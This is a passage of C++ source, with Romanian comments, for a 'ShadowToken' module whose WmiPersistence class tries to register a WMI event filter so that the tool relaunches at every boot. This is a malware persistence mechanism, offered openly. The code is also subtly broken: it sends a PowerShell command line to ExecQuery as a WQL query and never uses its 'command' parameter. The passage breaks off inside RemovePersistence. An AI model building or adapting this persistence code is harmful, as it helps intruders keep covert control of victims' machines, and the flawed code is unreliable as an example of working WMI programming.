#include <Windows.h>
#include <comdef.h>
#include <Wbemidl.h>
#include <iostream>

#pragma comment(lib, "wbemuuid.lib")

namespace ShadowToken {

    class WmiPersistence {
    public:
        WmiPersistence() {
            // Inițializează COM și WMI pentru interacțiune
            HRESULT hr = CoInitializeEx(0, COINIT_MULTITHREADED);
            if (FAILED(hr)) {
                std::cerr << "[Error] Nu s-a putut inițializa COM: " << hr << std::endl;
            }

            hr = CoInitializeSecurity(
                nullptr, -1, nullptr, nullptr,
                RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE,
                nullptr, EOAC_NONE, nullptr
            );
            if (FAILED(hr)) {
                std::cerr << "[Error] Nu s-a putut inițializa securitatea COM: " << hr << std::endl;
            }
        }

        ~WmiPersistence() {
            CoUninitialize();
        }

        // Configurarea unui eveniment WMI care va lansa ShadowToken la pornirea sistemului
        bool SetupPersistence(const std::wstring& command) {
            IWbemLocator* pLoc = nullptr;
            IWbemServices* pSvc = nullptr;

            HRESULT hr = CoCreateInstance(
                CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER,
                IID_IWbemLocator, (LPVOID*)&pLoc
            );
            if (FAILED(hr)) {
                std::cerr << "[Error] Nu s-a putut crea instanța WbemLocator: " << hr << std::endl;
                return false;
            }

            hr = pLoc->ConnectServer(
                _bstr_t(L"ROOT\\Subscription"), nullptr, nullptr, nullptr,
                0, nullptr, nullptr, &pSvc
            );
            if (FAILED(hr)) {
                std::cerr << "[Error] Nu s-a putut conecta la ROOT\\Subscription: " << hr << std::endl;
                pLoc->Release();
                return false;
            }

            hr = CoSetProxyBlanket(
                pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr,
                RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE
            );
            if (FAILED(hr)) {
                std::cerr << "[Error] Nu s-a putut seta blanket-ul de securitate pentru WMI: " << hr << std::endl;
                pSvc->Release();
                pLoc->Release();
                return false;
            }

            // Crearea unui event filter WMI pentru declanșarea comenzii la startup
            std::wstring query = L"SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_ComputerSystem' AND TargetInstance.BootupState = 'Normal boot'";
            std::wstring eventFilter = L"Set-WmiInstance -Namespace 'root\\subscription' -Class __EventFilter -Arguments @{Name='ShadowTokenBootTrigger'; EventNamespace='root\\cimv2'; QueryLanguage='WQL'; Query='" + query + L"'}";

            std::wstring commandLine = L"powershell.exe -Command \"" + eventFilter + L"\"";
            hr = pSvc->ExecQuery(_bstr_t("WQL"), _bstr_t(commandLine.c_str()), WBEM_FLAG_FORWARD_ONLY, nullptr, nullptr);

            if (FAILED(hr)) {
                std::cerr << "[Error] Nu s-a putut crea evenimentul WMI: " << hr << std::endl;
                pSvc->Release();
                pLoc->Release();
                return false;
            }

            pSvc->Release();
            pLoc->Release();
            std::cout << "[Info] Persistența WMI a fost configurată cu succes." << std::endl;
            return true;
        }

        // Șterge persistența WMI creată
        bool RemovePersistence() {
            IWbemLocator* pLoc = nullptr;
            IWbemServices* pSvc = nullptr;

            HRESULT hr = CoCreateInstance(
                CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER,
    
